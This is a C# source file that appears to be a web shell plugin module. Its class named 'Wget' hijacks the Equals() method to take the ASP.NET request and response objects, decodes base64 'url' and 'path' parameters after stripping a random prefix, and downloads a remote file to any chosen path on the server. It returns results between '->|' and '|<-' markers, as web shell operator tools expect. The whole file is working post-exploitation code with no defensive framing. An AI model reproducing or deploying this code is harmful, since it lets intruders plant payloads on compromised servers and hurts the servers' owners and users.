using System;
using System.IO;
using System.Net;
using System.Text;
using System.Web;
using System.Web.UI;

public class Wget
{
    public HttpRequest Request;
    public HttpResponse Response;
    public String encoder;
    public String decoder;
    public String cs;
    public String randomPrefix;


    public override bool Equals(object obj)
    {
        this.parseObj(obj);
        this.cs = "UTF-8";
        this.encoder = "base64";
        this.decoder = "";
        this.randomPrefix = "2";
        String tag_s = "->|";
        String tag_e = "|<-";
        this.Response.Charset = cs;
        String result = "";
        try
        {
            String url = decode(this.Request.Form["url"]);
            String path = decode(this.Request.Form["path"]);
            result += this.WgetCode(url, path);
        }
        catch (Exception e)
        {
            result = "ERROR:// " + e.Message;
        }

        this.Response.Write(tag_s + asoutput(result) + tag_e);
        return true;
    }

    public void parseObj(Object obj)
    {
        if (obj.GetType().IsArray)
        {
            Object[] data = (Object[])obj;
            this.Request = (HttpRequest)data[0];
            this.Response = (HttpResponse)data[1];
        }
        else
        {
            try
            {
                Page page = (Page)obj;
                this.Response = page.Response;
                this.Request = page.Request;
            }
            catch (Exception)
            {
                HttpContext context = (HttpContext)obj;
                this.Response = context.Response;
                this.Request = context.Request;
            }
        }
    }

    public String WgetCode(String url, String path)
    {
        HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(url));
        RQ.Method = "GET";
        RQ.ContentType = "application/x-www-form-urlencoded";
        HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
        Stream WF = WB.GetResponseStream();
        FileStream FS = new FileStream(path, FileMode.Create, FileAccess.Write);
        int i;
        byte[] buffer = new byte[1024];
        while (true)
        {
            i = WF.Read(buffer, 0, buffer.Length);
            if (i < 1)
            {
                break;
            }

            FS.Write(buffer, 0, i);
        }

        WF.Close();
        WB.Close();
        FS.Close();
        return "1";
    }

    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2),
                System.Globalization.NumberStyles.HexNumber))));
        }

        return sb.ToString();
    }

    public String decode(String src)
    {
        int prefixlen = 0;
        try
        {
            prefixlen = Int32.Parse(randomPrefix);
            src = src.Substring(prefixlen);
        }
        catch (Exception e)
        {
        }

        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                {
                    ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                    break;
                }
                case "hex":
                {
                    ret = HexAsciiConvert(src);
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }

    public String asoutput(String src)
    {
        String ret;
        try
        {
            switch (decoder)
            {
                case "base64":
                {
                    ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }
}